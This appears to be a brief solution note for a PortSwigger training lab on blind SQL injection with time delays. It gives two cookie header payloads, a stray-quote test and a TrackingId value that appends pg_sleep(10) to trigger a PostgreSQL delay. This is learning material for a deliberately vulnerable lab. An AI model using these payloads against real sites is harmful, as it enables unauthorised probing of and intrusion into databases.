# Blind SQL injection with time delays
# https://portswigger.net/web-security/sql-injection/blind/lab-time-delays

```bash
Cookie: TrackingId=NYUjfDvZrGAo9IQL'
```
```bash
Cookie: TrackingId=NYUjfDvZrGAo9IQL'||pg_sleep(10)--;
```
